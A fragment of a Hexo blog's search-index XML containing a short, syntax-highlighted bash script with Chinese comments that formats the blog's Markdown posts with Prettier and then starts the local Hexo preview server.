class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-comment"># 移动到上级目录</span><br><span class="hljs-built_in">cd</span> ../ || &#123;<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;cd ../ failed&quot;</span><br>    <span class="hljs-built_in">exit</span> 1<br>&#125;<br><br><span class="hljs-comment"># 执行 Prettier 格式化</span><br>npx prettier --write <span class="hljs-string">&quot;./source/_posts/*.md&quot;</span> || &#123; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Prettier format failed&quot;</span>; <span class="hljs-built_in">exit</span> 1; &#125;<br><br><span class="hljs-comment"># 本地预览</span><br>hexo s<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>About</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
